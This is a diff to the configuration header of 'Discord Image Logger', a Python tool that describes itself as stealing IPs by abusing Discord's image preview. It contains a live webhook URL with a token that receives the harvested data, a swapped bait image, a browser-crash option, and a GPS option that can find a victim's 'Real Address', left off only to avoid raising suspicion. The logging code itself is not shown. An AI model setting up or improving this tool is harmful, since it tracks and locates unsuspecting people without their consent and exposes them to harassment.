@@ -1,4 +1,3 @@
-
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
@@ -7,14 +6,14 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature'
+__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1347206698766438542/gnlPhAt3Lpd2sq3qgoAvFNzDUsXsC0Tj2joLcb79t-rLgL2i2X2vgcdD0-9M8Yhj8Giv",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9y9MPxbuRGiZQOqwiJLhIfMfRqT_fJmp56g&s", # You can also have a custom image by using a URL argument
+    "image": "https://memepedia.ru/wp-content/uploads/2019/04/haker-s-sinim-noutbukom-11.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -23,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
